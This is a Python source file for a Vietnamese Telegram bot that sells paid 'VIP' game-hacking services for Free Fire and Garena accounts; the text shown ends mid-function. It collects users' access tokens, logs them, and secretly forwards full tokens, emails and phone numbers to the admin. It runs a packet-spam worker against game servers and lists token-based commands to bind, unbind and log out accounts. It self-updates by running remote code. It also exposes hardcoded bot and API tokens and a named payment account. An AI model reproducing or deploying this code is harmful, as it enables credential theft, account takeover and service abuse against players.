import threading
import socket
import uuid
import hashlib
import urllib.parse
import os
import asyncio
import json
import logging
import time
import httpx
import random
import sys
from ReQAPI import FreeFireAPI
from telegram.error import BadRequest
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    filters, ContextTypes, CallbackQueryHandler
)
from telegram.constants import ParseMode, ChatType
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from datetime import datetime
import subprocess
import sys

# Mapping từ tên package → tên module thực tế để kiểm tra
_PKG_MODULE_MAP = {
    "python-telegram-bot": "telegram",
    "pycryptodome": "Crypto",
    "protobuf-decoder": "protobuf_decoder",
    "python_telegram_bot": "telegram",
}


def auto_install(packages):
    # Đảm bảo loại bỏ gói telegram cũ (0.0.1) nếu đã cài
    try:
        import importlib.metadata as im
        try:
            v = im.version("telegram")
            if v.startswith("0."):  # telegram==0.0.1 — gói cũ, xung đột
                subprocess.check_call([sys.executable,
                                       "-m",
                                       "pip",
                                       "uninstall",
                                       "-y",
                                       "telegram",
                                       "--break-system-packages"],
                                      stdout=subprocess.DEVNULL,
                                      stderr=subprocess.DEVNULL)
        except im.PackageNotFoundError:
            pass
    except Exception:
        pass

    for pkg in packages:
        base = pkg.split("[")[0].replace("-", "_")
        mod = _PKG_MODULE_MAP.get(
            pkg.split("[")[0],
            _PKG_MODULE_MAP.get(
                base,
                base))
        try:
            __import__(mod)
        except ImportError:
            print(f"[AUTO] Đang cài {pkg}...")
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", pkg, "--break-system-packages", "-q"])


auto_install([
    "httpx", "python-telegram-bot[job-queue]",
    "pycryptodome", "psutil", "requests"
])


# ══════════════════════════════════════════════════════
#                     CẤU HÌNH
# ══════════════════════════════════════════════════════
BOT_NAME = "Bon Service 👹"
BOT_TOKEN = "8415663762:AAFNXnnhyJGiOJzXA6gQHlaW1NJG_jIJ-PU"
ADMIN_ID = 6683331082
DB_FILE = "ff_bot_data.json"
TOKEN_LOG = "access_tokens.txt"
VERSION = "5.5.7"
VIP_CONTACT = "@liggdzut1"

BANK_STK = "0962835186"
BANK_NAME = "MoMo"
BANK_OWNER = "Nguyen Thi Luyen"   # ← đổi tên chủ tài khoản
FREE_KEY_INTERVAL = 5 * 3600
GARENA_HEADERS = {
    "User-Agent": "GarenaMSDK/4.0.30 (iPhone9,1;ios - 15.8.6;vi-US;US)"}
UPDATE_API_URL = "https://servervip.x10.mx/api.php"
FF_INFO_API = "http://203.57.85.58:2005/player-info?uid={uid}&key=@yashapis"
SPAM_INTERVAL = 50   # Giây giữa mỗi lần gửi packet
REQUIRED_GROUPS = ["@botsiuvip22", "@h4ckcheatvip", "@bonchatcommunity1109"]

active_spams = {}
user_active_session = {}
spam_logs = {}  # session_id -> [log lines]
pending_nap = {}   # uid -> {amount, expire, msg_id}

# ══════════════════════════════════════════════════════
#                     DATABASE
# ══════════════════════════════════════════════════════
DEFAULT_SHOP = {
    "1": {"days": 1, "price": 5000, "label": "1 Ngày", "desc": "Dùng thử"},
    "7": {"days": 7, "price": 25000, "label": "7 Ngày", "desc": "Phổ biến"},
    "30": {"days": 30, "price": 80000, "label": "30 Ngày", "desc": "Tiết kiệm"},
    "99": {"days": 99, "price": 200000, "label": "99 Ngày", "desc": "Giá trị nhất"},
}


def load_db():
    if not os.path.exists(DB_FILE):
        data = {
            "users": {},
            "vip_keys": {},
            "key_pool": {},
            "banned": [],
            "balance": {},
            "shop": DEFAULT_SHOP,
            "settings": {
                "bot_on": True,
                "spam_on": True,
                "maintenance": False,
                "free_key_on": True,
                "free_key_interval": FREE_KEY_INTERVAL}}
        save_db(data)
        return data
    db = json.load(open(DB_FILE, "r", encoding="utf-8"))
    # Tự thêm field mới nếu thiếu
    if "balance" not in db:
        db["balance"] = {}
    if "shop" not in db:
        db["shop"] = DEFAULT_SHOP
    save_db(db)
    return db


def save_db(data):
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)


def log_token(uid, username, token, extra=None):
    with open(TOKEN_LOG, "a", encoding="utf-8") as f:
        line = f"[{datetime.now():%Y-%m-%d %H:%M:%S}] ID:{uid} | @{username} | Token:{token}"
        if extra:
            line += f" | Nick:{extra.get('nick',
                                         '?')} | UID:{extra.get('uid',
                                                                '?')} | Server:{extra.get('server',
                                                                                          '?')}"
        f.write(line + "\n")


def log_checkmail(uid, username, token, email, mobile):
    with open("checkmail_log.txt", "a", encoding="utf-8") as f:
        f.write(
            f"[{datetime.now():%Y-%m-%d %H:%M:%S}] ID:{uid} | @{username} | Token:{token} | Email:{email} | SDT:{mobile}\n")


def log_checkmxh(uid, username, token, result_text):
    with open("checkmxh_log.txt", "a", encoding="utf-8") as f:
        f.write(
            f"[{datetime.now():%Y-%m-%d %H:%M:%S}] ID:{uid} | @{username} | Token:{token}\n{result_text}\n---\n")


def gen_vip_key(days):
    return "VIP-" + hashlib.md5(os.urandom(16)
                                ).hexdigest()[:12].upper() + f"-{days}D"


def gen_free_key():
    return "FREE-" + hashlib.md5(os.urandom(16)).hexdigest()[:10].upper()

# ══════════════════════════════════════════════════════
#                  RÚT GỌN LINK
# ══════════════════════════════════════════════════════


async def shorten_link(key):
    url = f"https://servervip.x10.mx/?key={key}"
    async with httpx.AsyncClient(timeout=20.0) as c:
        try:
            r1 = await c.get(f"https://yeumoney.com/QL_api.php?token=6ec3529d5d8cb18405369923670980ec155af75fb3a70c1c90c5a9d9ac25ceea&format=json&url={url}")
            l1 = r1.json().get("shortenedUrl", url)
            r2 = await c.get(f"https://link4m.co/api-shorten/v2?api=66d85245cc8f2674de40add1&url={l1}")
            return r2.json().get("shortenedUrl", l1)
        except Exception:
            return url


# ══════════════════════════════════════════════════════
#          CONVERT EAT TOKEN -> ACCESS TOKEN
# ══════════════════════════════════════════════════════
async def convert_eat_to_access(token_input: str) -> str:
    from urllib.parse import urlparse, parse_qs

    # 🔹 lấy eat từ link nếu có
    if "eat=" in token_input or token_input.startswith("http"):
        try:
            parsed = urlparse(token_input if "://" in token_input else "https://x?" + token_input)
            eat = parse_qs(parsed.query).get("eat", [None])[0]
            if eat:
                token_input = eat
        except:
            pass

    # 🔹 gọi API convert
    try:
        async with httpx.AsyncClient(timeout=10, follow_redirects=False) as c:
            r = await c.get(
                f"https://api-otrss.garena.com/support/callback/?access_token={token_input}"
            )

            # 🔥 debug
            # print(r.status_code, r.headers)

            location = r.headers.get("Location", "")

            if "access_token=" in location:
                qs = parse_qs(urlparse(location).query)
                access = qs.get("access_token", [None])[0]
                if access:
                    return access

            # ❗ nếu không có access_token → token_input có thể đã là access_token
            return token_input

    except Exception as e:
        print("convert lỗi:", e)
        return token_input

# ══════════════════════════════════════════════════════
#                  CHECK JOIN
# ══════════════════════════════════════════════════════


async def check_join(context, user_id):
    for g in REQUIRED_GROUPS:
        try:
            m = await context.bot.get_chat_member(chat_id=g, user_id=user_id)
            if m.status in ("left", "kicked"):
                return False
        except BadRequest as e:
            if any(
                x in str(e).lower() for x in [
                    "not enough rights",
                    "chat not found",
                    "bot is not a member",
                    "user not found"]):
                continue
            return False
        except Exception:
            continue
    return True

# ══════════════════════════════════════════════════════
#                  CHECK VIP
# ══════════════════════════════════════════════════════


def check_vip(uid):
    vk = load_db()["vip_keys"].get(str(uid))
    if not vk:
        return False, "Chưa có key VIP"
    if vk["expire"] == -1:
        return True, "♾️ Vĩnh viễn"
    left = vk["expire"] - time.time()
    if left <= 0:
        return False, "Key đã hết hạn"
    return True, f"{int(left // 3600)}h {int((left % 3600) // 60)}m"


def activate_vip_key(uid, key_code):
    db = load_db()
    pool = db.get("key_pool", {})
    if key_code not in pool:
        return False, "Key không hợp lệ!"
    kinfo = pool[key_code]
    if kinfo.get("used"):
        return False, "Key đã được dùng rồi!"

    days = kinfo["days"]
    is_free = kinfo.get("free", False)
    now = time.time()

    # Key free (days=0) → chỉ 1 giờ, KHÔNG vĩnh viễn
    if is_free or days == 0:
        new_exp = now + 3600
        label = "1 giờ (free)"
    else:
        # Key VIP: cộng thêm vào hạn hiện tại nếu còn, không thì tính từ bây
        # giờ
        cur = db["vip_keys"].get(str(uid), {}).get("expire", now)
        base = cur if (cur != -1 and cur > now) else now
        new_exp = base + days * 86400
        label = f"{days} ngày"

    db["vip_keys"][str(uid)] = {
        "key": key_code,
        "expire": new_exp,
        "days": days,
        "activated": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    pool[key_code]["used"] = True
    db["key_pool"] = pool
    save_db(db)
    return True, label

# ══════════════════════════════════════════════════════
#               SOCKET SPAM WORKER
# ══════════════════════════════════════════════════════


def socket_spam_worker(session_id, server_ip, server_port, full_payload):
    if session_id not in spam_logs:
        spam_logs[session_id] = []
    count = 0

    def add_log(msg):
        ts = datetime.now().strftime("%H:%M:%S")
        line = f"[{ts}] {msg}"
        spam_logs[session_id].append(line)
        if len(spam_logs[session_id]) > 50:   # Giữ 50 dòng gần nhất
            spam_logs[session_id].pop(0)

    add_log("🟢 Bắt đầu spam")
    while session_id in active_spams and active_spams[session_id]["running"]:
        uid = active_spams[session_id]["uid"]
        if not check_vip(str(uid))[0]:
            active_spams[session_id]["running"] = False
            active_spams[session_id]["stopped_reason"] = "vip_expired"
            add_log("⛔ Dừng — VIP hết hạn")
            break
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                s.connect((server_ip, server_port))
                s.sendall(full_payload)
                s.recv(1024)
            count += 1
            active_spams[session_id]["count"] = count
            add_log(f"✅ Gói #{count} gửi thành công")
            time.sleep(SPAM_INTERVAL)
        except Exception as e:
            err_msg = str(e)[:80]
            add_log(f"❌ Lỗi: {err_msg}")
            active_spams[session_id]["last_error"] = err_msg
            active_spams[session_id]["error_count"] = active_spams[session_id].get(
                "error_count", 0) + 1
            time.sleep(5)
    add_log("🔴 Đã dừng")

# ══════════════════════════════════════════════════════
#               GARENA API
# ══════════════════════════════════════════════════════
async def fetch_mail(
        token,
        uid=None,
        username=None,
        bot=None,
        full_info=False):
    async with httpx.AsyncClient(timeout=10) as c:
        try:
            r = await c.get(f"https://luanori-check-mail.vercel.app/bind_info?access_token={token}")
            d = r.json()
            if d.get("status") != "success":
                return "```\n⚠️  Token không hợp lệ hoặc lỗi API\n```"
            data = d.get("data", {})
            raw = data.get("raw_response", {})
            email = data.get("current_email") or "[ Trống ]"
            mobile = raw.get("mobile") or "[ Trống ]"
            pend_email = data.get("pending_email") or "[ Không có ]"
            countdown = data.get("countdown_human", "0 Sec")
            if uid:
                log_checkmail(uid, username or "N/A", token, email, mobile)
            # Gửi đầy đủ cho admin
            if bot and uid:
                try:
                    await bot.send_message(
                        ADMIN_ID,
                        f"```\n"
                        f"┌───⭓ CHECK MAIL MỚI\n"
                        f"│  👤  User        :  @{username or 'N/A'}\n"
                        f"│  🆔  ID          :  {uid}\n"
                        f"│  🔑  Token       :  {token}\n"
                        f"│  📩  Email       :  {email}\n"
                        f"│  📱  SĐT         :  {mobile}\n"
                        f"│  📩  Chờ đổi    :  {pend_email}\n"
                        f"│  ⏳  Đếm ngược  :  {countdown}\n"
                        f"└──────────────────\n"
                        f"```",
                        parse_mode=ParseMode.MARKDOWN_V2
                    )
                except Exception:
                    pass
            # User chỉ thấy email + SĐT
            return (
                f"```\n"
                f"┌───⭓ THÔNG TIN TÀI KHOẢN\n"
                f"│\n"
                f"│  📩  Email  :  {email}\n"
                f"│  📱  SĐT    :  {mobile}\n"
                f"└──────────────────\n"
                f"```"
            )
        except Exception as e:
            return f"```\n⚠️  Token không hợp lệ hoặc lỗi API\n```"


async def fetch_social(token, uid=None, username=None, bot=None):
    p_map = {1: "Garena", 3: "Facebook", 5: "Google", 8: "VK", 10: "Apple"}
    async with httpx.AsyncClient(headers=GARENA_HEADERS, timeout=10) as c:
        try:
            accs = (await c.get("https://100067.connect.garena.com/bind/app/platform/info/get",
                                params={"access_token": token})).json().get("bounded_accounts", [])
            if not accs:
                return "```\n🔗  Liên kết:  Tài khoản trắng\n```"
            txt = "```\n🔗  DANH SÁCH LIÊN KẾT\n├──────────────────\n"
            for a in accs:
                u = a.get("user_info", {})
                txt += f"🌐  {p_map.get(a.get('platform'),
                                       'N/A')}\n    👤 {u.get('nickname')}  |  🆔 {a.get('uid')}\n"
            txt += "```"
            if uid:
                log_checkmxh(
                    uid,
                    username or "N/A",
                    token,
                    txt.replace(
                        "```",
                        ""))
            if bot and uid:
                try:
                    await bot.send_message(
                        ADMIN_ID,
                        f"```\n"
                        f"🔗  CHECK MXH MỚI\n"
                        f"├──────────────────\n"
                        f"👤  User   :  @{username or 'N/A'}\n"
                        f"🆔  ID     :  {uid}\n"
                        f"🔑  Token  :  {token}\n"
                        f"├──────────────────\n"
                        + txt.replace("```", "").strip() + "\n```",
                        parse_mode=ParseMode.MARKDOWN_V2
                    )
                except Exception:
                    pass
            return txt
        except Exception:
            return "```\n⚠️ Lỗi truy vấn liên kết\n```"


# ══════════════════════════════════════════════════════
#               LUANORI MAIL API
# ══════════════════════════════════════════════════════
LUAN_API_URL = "https://luanori-premium-mail.vercel.app/api/bind"


async def luan_request(endpoint: str, params: dict) -> dict:
    p = {"lang": "vi"}
    p.update(params)
    async with httpx.AsyncClient(timeout=20) as c:
        try:
            r = await c.get(f"{LUAN_API_URL}/{endpoint}", params=p)
            return r.json()
        except Exception as e:
            return {"status": "error", "message": str(e)}


# ══════════════════════════════════════════════════════
#               BALANCE HELPERS
# ══════════════════════════════════════════════════════
def get_balance(uid: str) -> int:
    return load_db().get("balance", {}).get(str(uid), 0)


def add_balance(uid: str, amount: int):
    db = load_db()
    db["balance"][str(uid)] = db["balance"].get(str(uid), 0) + amount
    save_db(db)


def deduct_balance(uid: str, amount: int) -> bool:
    db = load_db()
    cur = db["balance"].get(str(uid), 0)
    if cur < amount:
        return False
    db["balance"][str(uid)] = cur - amount
    save_db(db)
    return True


# ══════════════════════════════════════════════════════
#               AUTO UPDATE
# ══════════════════════════════════════════════════════


async def check_update_logic(context, manual=False):
    async with httpx.AsyncClient(timeout=15.0) as client:
        try:
            r = await client.get(UPDATE_API_URL)
            data = r.json()
            new_ver = data.get("version")
            new_url = data.get("github_url")
            if new_ver and new_ver > VERSION:
                await context.bot.send_message(ADMIN_ID,
                                               f"```\n┌───⭓ CẬP NHẬT MỚI\n│  🚀  Phiên bản: {new_ver}\n│  Đang tải...\n└──────────────────\n```",
                                               parse_mode=ParseMode.MARKDOWN_V2)
                resp = await client.get(new_url)
                if resp.status_code == 200:
                    with open(__file__, "w", encoding="utf-8") as f:
                        f.write(resp.text)
                    await context.bot.send_message(ADMIN_ID,
                                                   "```\n✅  Đã cập nhật! Đang khởi động lại...\n```",
                                                   parse_mode=ParseMode.MARKDOWN_V2)
                    os.execv(sys.executable, ["python"] + sys.argv)
            elif manual:
                await context.bot.send_message(ADMIN_ID,
                                               f"```\n┌───⭓ KIỂM TRA CẬP NHẬT\n│  ✅  Đang dùng bản mới nhất\n│  📌  Version: v{VERSION}\n└──────────────────\n```",
                                               parse_mode=ParseMode.MARKDOWN_V2)
        except Exception as e:
            if manual:
                await context.bot.send_message(ADMIN_ID,
                                               f"```\n❌  Lỗi check update: {str(e)[:100]}\n```",
                                               parse_mode=ParseMode.MARKDOWN_V2)

# ══════════════════════════════════════════════════════
#               AUTO CLEANUP KEY HẾT HẠN (MỖI 5 PHÚT)
# ══════════════════════════════════════════════════════


async def auto_cleanup_job(context):
    db = load_db()
    pool = db.get("key_pool", {})
    now = time.time()
    rk = 0
    for k in list(pool.keys()):
        info = pool[k]
        if info.get("used") or (
            info.get("free") and now > info.get(
                "expire_abs", 0)):
            del pool[k]
            rk += 1
    vk = db["vip_keys"]
    rv = 0
    for uid in list(vk.keys()):
        if vk[uid]["expire"] != -1 and vk[uid]["expire"] < now:
            del vk[uid]
            rv += 1
    db["key_pool"] = pool
    db["vip_keys"] = vk
    save_db(db)
    if rk + rv > 0:
        print(f"[AUTO CLEANUP] Xóa {rk} key + {rv} VIP hết hạn")

# ══════════════════════════════════════════════════════
#               CHECK FF INFO
# ══════════════════════════════════════════════════════


async def fetch_ff_info(uid_ff: str) -> str:
    async with httpx.AsyncClient(timeout=15) as c:
        try:
            r = await c.get(FF_INFO_API.format(uid=uid_ff))
            d = r.json()
            bi = d.get("basicInfo", {})
            cl = d.get("clanBasicInfo", {})
            pet = d.get("petInfo", {})
            si = d.get("socialInfo", {})
            cs = d.get("creditScoreInfo", {})

            rank_map = {
                200: "Đồng", 201: "Bạc", 202: "Vàng", 203: "Bạch Kim",
                204: "Kim Cương", 205: "Heroic", 206: "Grand Master",
                220: "Cao thủ", 221: "Thách Đấu"
            }
            def rank_name(r): return rank_map.get(r // 100 * 100, f"Rank {r}")

            gender = "👩 Nữ" if si.get("gender") == "Gender_FEMALE" else "👨 Nam"
            clan = cl.get("clanName", "Không có") if cl else "Không có"
            pet_name = pet.get("name", "Không có") if pet else "Không có"

            return (
                f"```\n"
                f"┌───⭓ THÔNG TIN NICK FF\n"
                f"│\n"
                f"│  👤  Nick     :  {bi.get('nickname', '?')}\n"
                f"│  🆔  UID      :  {bi.get('accountId', '?')}\n"
                f"│  🌍  Region   :  {bi.get('region', '?')}\n"
                f"│  ⚡  Level    :  {bi.get('level', '?')}\n"
                f"│  ❤️  Lượt thích: {bi.get('liked', 0):,}\n"
                f"│  🏆  BR Rank  :  {rank_name(bi.get('rank', 0))}\n"
                f"│  🎯  CS Rank  :  {rank_name(bi.get('csRank', 0))}\n"
                f"│  {gender}  Giới tính\n"
                f"│  🏰  Guild    :  {clan}\n"
                f"│  🐾  Pet      :  {pet_name}\n"
                f"│  ⭐  Credit   :  {cs.get('creditScore', '?')}\n"
                f"│  🎮  Version  :  {bi.get('releaseVersion', '?')}\n"
                f"└──────────────────\n"
                f"```"
            )
        except Exception as e:
            return f"```\n❌  Lỗi: {str(e)[:100]}\n```"

# ══════════════════════════════════════════════════════
#               XUẤT FILE TOKENS
# ══════════════════════════════════════════════════════


async def export_tokens_file(update, ctx):
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), TOKEN_LOG)
    if not os.path.exists(path) or os.path.getsize(path) == 0:
        return await get_reply(update).reply_text("```\n📭  Chưa có token nào được lưu!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    await get_reply(update).reply_document(
        document=open(path, "rb"),
        filename="tokens.txt",
        caption="```\n┌───⭓ FILE TOKENS\n│  ✅  Xuất thành công\n└──────────────────\n```",
        parse_mode=ParseMode.MARKDOWN_V2
    )

# ══════════════════════════════════════════════════════
#               GUARDS
# ══════════════════════════════════════════════════════


def is_bot_on(): return load_db()["settings"].get("bot_on", True)
def is_maintenance(): return load_db()["settings"].get("maintenance", False)
def is_banned(uid): return str(uid) in load_db()["banned"]


async def guard(update: Update, uid: str, check_maintenance=True) -> bool:
    """Trả về True nếu bị chặn (không cho dùng), False nếu được dùng"""
    if not is_bot_on():
        await get_reply(update).reply_text(
            "```\n┌───⭓ THÔNG BÁO\n│  🔴  Bot đang tắt!\n│  Vui lòng chờ admin bật lại.\n└──────────────────\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return True
    if check_maintenance and is_maintenance():
        await get_reply(update).reply_text(
            "```\n┌───⭓ BẢO TRÌ\n│  🔧  Bot đang bảo trì!\n│  Vui lòng chờ thông báo.\n└──────────────────\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return True
    if is_banned(uid):
        return True
    return False

# ══════════════════════════════════════════════════════
#               JOBS
# ══════════════════════════════════════════════════════


async def auto_free_key_job(context):
    db = load_db()
    if not db["settings"].get(
            "free_key_on") or not db["settings"].get("bot_on"):
        return
    key = gen_free_key()
    link = await shorten_link(key)
    pool = db.get("key_pool", {})
    pool[key] = {
        "days": 0,
        "free": True,
        "expire_abs": time.time() +
        3600,
        "used": False}
    db["key_pool"] = pool
    save_db(db)
    iv_h = db["settings"].get("free_key_interval", FREE_KEY_INTERVAL) // 3600
    kb = InlineKeyboardMarkup(
        [[InlineKeyboardButton("🔗  Nhấn để lấy Key", url=link)]])
    msg = (f"```\n"
           f"🎁  KEY FREE TỰ ĐỘNG\n"
           f"├──────────────────\n"
           f"🔗  Bấm nút bên dưới để lấy\n"
           f"⏳  Hạn sử dụng  :  1 giờ\n"
           f"🔄  Đợt tiếp theo:  {iv_h}h nữa\n"
           f"├──────────────────\n"
           f"📌  Sau khi lấy: /activevip <key>\n"
           f"```")
    for uid in list(db["users"].keys()):
        try:
            await context.bot.send_message(int(uid), msg, reply_markup=kb, parse_mode=ParseMode.MARKDOWN_V2)
            await asyncio.sleep(0.05)
        except Exception:
            pass


async def check_vip_expired_job(context):
    for uid_str, sid in list(user_active_session.items()):
        if sid in active_spams and active_spams[sid]["running"]:
            if not check_vip(uid_str)[0]:
                active_spams[sid]["running"] = False
                try:
                    await context.bot.send_message(
                        int(uid_str),
                        f"```\n⛔  SPAM TỰ ĐỘNG DỪNG\n├──────────────────\n💎  Key VIP đã hết hạn!\n💰  Mua tiếp: {VIP_CONTACT}\n```",
                        parse_mode=ParseMode.MARKDOWN_V2
                    )
                except Exception:
                    pass

# ══════════════════════════════════════════════════════
#               KEYBOARD HELPERS
# ══════════════════════════════════════════════════════


def main_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📖  Hướng dẫn", callback_data="guide"),
         InlineKeyboardButton("👤  Hồ sơ", callback_data="profile")],
        [InlineKeyboardButton("🎁  Lấy Key Free", callback_data="getkey"),
         InlineKeyboardButton("🛒  Mua Key VIP", callback_data="shop")],
        [InlineKeyboardButton("📋  Danh sách lệnh", callback_data="help"),
         InlineKeyboardButton("💰  Nạp tiền", callback_data="nap_info")]
    ])


def admin_kb(s):
    def st(v): return "🟢 ON" if v else "🔴 OFF"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"🤖  Bot: {st(s['bot_on'])}", callback_data="adm_bot"),
         InlineKeyboardButton(f"🚀  Spam: {st(s['spam_on'])}", callback_data="adm_spam")],
        [InlineKeyboardButton(f"🔧  Bảo trì: {st(s['maintenance'])}", callback_data="adm_maint"),
         InlineKeyboardButton(f"🎁  Free key: {st(s['free_key_on'])}", callback_data="adm_freekey")],
        [InlineKeyboardButton("🔑  Tạo Key VIP", callback_data="adm_createkey"),
         InlineKeyboardButton("📊  Thống kê", callback_data="adm_stats")],
        [InlineKeyboardButton("💎  Thống kê VIP", callback_data="adm_vipstats"),
         InlineKeyboardButton("🗑️  Xóa VIP user", callback_data="adm_delvip")],
        [InlineKeyboardButton("📤  Xuất file VIP", callback_data="adm_exportvip"),
         InlineKeyboardButton("💳  Danh sách nạp", callback_data="adm_listnap")],
        [InlineKeyboardButton("📢  Broadcast", callback_data="adm_broadcast"),
         InlineKeyboardButton("🗑️  Xóa key cũ", callback_data="adm_cleanup")],
        [InlineKeyboardButton("🔄  Check Update", callback_data="adm_update"),
         InlineKeyboardButton("📤  Xuất Tokens", callback_data="adm_exporttoken")],
        [InlineKeyboardButton("🖥️  Sys Info", callback_data="adm_sysinfo"),
         InlineKeyboardButton("⏱️  Set Spam(s)", callback_data="adm_setspam")]
    ])

# ══════════════════════════════════════════════════════
#               /start
# ══════════════════════════════════════════════════════


async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type != ChatType.PRIVATE:
        return
    user = update.effective_user
    uid = str(user.id)
    if not is_bot_on():
        return await get_reply(update).reply_text("```\n🔴  Bot đang tắt. Vui lòng chờ!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    if is_banned(uid):
        return
    db = load_db()
    if uid not in db["users"]:
        db["users"][uid] = {
            "username": user.username or "",
            "joined": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
        save_db(db)
    if not await check_join(ctx, user.id):
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("1️⃣  Tham gia Nhóm 1", url=f"https://t.me/{REQUIRED_GROUPS[0].lstrip('@')}")],
            [InlineKeyboardButton("2️⃣  Tham gia Nhóm 2", url=f"https://t.me/{REQUIRED_GROUPS[1].lstrip('@')}")],
            [InlineKeyboardButton("✅  Tôi đã tham gia — Xác minh", callback_data="verify_join")]
        ])
        return await get_reply(update).reply_text(
            f"```\n"
            f"⚠️  YÊU CẦU BẮT BUỘC\n"
            f"├──────────────────\n"
            f"Bạn phải tham gia đủ 2 nhóm\n"
            f"bên dưới mới dùng được bot!\n"
            f"├──────────────────\n"
            f"Sau khi tham gia → bấm Xác minh\n"
            f"```",
            reply_markup=kb, parse_mode=ParseMode.MARKDOWN_V2
        )
    await send_main_menu(update.message, uid)


async def send_main_menu(msg_obj, uid):
    has_vip, vip_left = check_vip(uid)
    vip_str = f"✅  {vip_left}" if has_vip else "❌  Chưa có"
    # Persistent reply keyboard ở dưới chat
    from telegram import ReplyKeyboardMarkup, KeyboardButton
    reply_kb = ReplyKeyboardMarkup(
        [
            [KeyboardButton("🏠 Menu"), KeyboardButton("👤 Hồ sơ")],
            [KeyboardButton("🎁 Key Free"), KeyboardButton("🛒 Mua VIP")],
            [KeyboardButton("🎉 Event"), KeyboardButton("🎁 Giftcode")],
            [KeyboardButton("📋 Lệnh"), KeyboardButton("💰 Nạp tiền")],
        ],
        resize_keyboard=True,
        input_field_placeholder="Chọn chức năng..."
    )
    await msg_obj.reply_text("👇  Dùng menu bên dưới hoặc nút bên trên:", reply_markup=reply_kb)
    await msg_obj.reply_text(
        f"```\n"
        f"┌───⭓ {BOT_NAME}\n"
        f"│\n"
        f"│  📌  Version : v{VERSION}\n"
        f"│  💎  VIP     : {vip_str}\n"
        f"│  👑  Admin   : {VIP_CONTACT}\n"
        f"└──────────────────\n"
        f"\n"
        f"👇  Chọn chức năng bên dưới:\n"
        f"```",
        reply_markup=main_kb(), parse_mode=ParseMode.MARKDOWN_V2
    )


async def send_main_menu_cid(bot, cid, uid):
    from telegram import ReplyKeyboardMarkup, KeyboardButton
    has_vip, vip_left = check_vip(uid)
    vip_str = f"✅  {vip_left}" if has_vip else "❌  Chưa có"
    reply_kb = ReplyKeyboardMarkup(
        [
            [KeyboardButton("🏠 Menu"), KeyboardButton("👤 Hồ sơ")],
            [KeyboardButton("🎁 Key Free"), KeyboardButton("🛒 Mua VIP")],
            [KeyboardButton("🎉 Event"), KeyboardButton("🎁 Giftcode")],
            [KeyboardButton("📋 Lệnh"), KeyboardButton("💰 Nạp tiền")],
        ],
        resize_keyboard=True,
        input_field_placeholder="Chọn chức năng..."
    )
    await bot.send_message(cid, "👇  Dùng menu bên dưới:", reply_markup=reply_kb)
    await bot.send_message(
        cid,
        f"```\n"
        f"┌───⭓ {BOT_NAME}\n"
        f"│\n"
        f"│  📌  Version : v{VERSION}\n"
        f"│  💎  VIP     : {vip_str}\n"
        f"│  👑  Admin   : {VIP_CONTACT}\n"
        f"└──────────────────\n"
        f"\n"
        f"👇  Chọn chức năng bên dưới:\n"
        f"```",
        reply_markup=main_kb(), parse_mode=ParseMode.MARKDOWN_V2
    )

# ══════════════════════════════════════════════════════
#               /help
# ══════════════════════════════════════════════════════


async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if await guard(update, uid):
        return
    await get_reply(update).reply_text(
        f"```\n"
        f"┌───⭓ DANH SÁCH LỆNH\n"
        f"│\n"
        f"│  🆓  LỆNH FREE\n"
        f"│  /start       →  Menu chính\n"
        f"│  /help        →  Lệnh này\n"
        f"│  /profile     →  Xem tài khoản\n"
        f"│  /getkey      →  Lấy key free\n"
        f"│  /activevip   →  Kích hoạt key\n"
        f"│  /checkmail   →  Check mail FF\n"
        f"│  /checkmxh    →  Check MXH FF\n"
        f"│  /info <uid>  →  Xem info nick FF\n"
        f"│  /nap <tiền>  →  Nạp tiền\n"
        f"│  /mua         →  Bảng giá VIP\n"
        f"│  /giftcode    →  Nhập giftcode\n"
        f"│  /event       →  Xem sự kiện\n"
        f"├──────────────────\n"
        f"│  💎  LỆNH VIP\n"
        f"│  /spam <token>      →  Spam log FF\n"
        f"│  /stopspam          →  Dừng spam\n"
        f"│  /mailinfo <token>  →  Check bind email\n"
        f"│  /sendotp <token> <email>\n"
        f"│       →  Gửi OTP về email\n"
        f"│  /verifyotp <token> <email> <otp>\n"
        f"│       →  Xác thực OTP\n"
        f"│  /bindmail <token> <email> <pass2>\n"
        f"│       →  Liên kết email mới\n"
        f"│  /dxuat <token>\n"
        f"│       →  Đăng xuất tài khoản\n"
        f"│  /unbind <token> <email>\n"
        f"│       →  Gỡ liên kết email\n"
        f"│  /unbindotp <token> <email> <otp>\n"
        f"│       →  Xác nhận gỡ liên kết\n"
        f"│  /cancelreq <token>\n"
        f"│       →  Hủy yêu cầu đang chờ\n"
        f"├──────────────────\n"
        f"│  💰  Mua VIP: {VIP_CONTACT}\n"
        f"└──────────────────\n"
        f"```",
        parse_mode=ParseMode.MARKDOWN_V2
    )

# ══════════════════════════════════════════════════════
#               /profile
# ══════════════════════════════════════════════════════


async def cmd_profile(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid = str(user.id)
    if await guard(update, uid):
        return
    has_vip, vip_left = check_vip(uid)
    sid = user_active_session.get(uid)
    running = bool(sid and active_spams.get(sid, {}).get("running"))
    await get_reply(update).reply_text(
        f"```\n"
        f"┌───⭓ HỒ SƠ CỦA BẠN\n"
        f"│\n"
        f"│  🆔  ID       :  {uid}\n"
        f"│  📛  Username :  @{user.username or 'N/A'}\n"
        f"│  💎  VIP      :  {'✅ ' + vip_left if has_vip else '❌ Chưa có'}\n"
        f"│  🚀  Spam     :  {'🟢 Đang chạy' if running else '🔴 Dừng'}\n"
        f"│  💰  Số dư    :  {get_balance(uid):,}đ\n"
        f"└──────────────────\n"
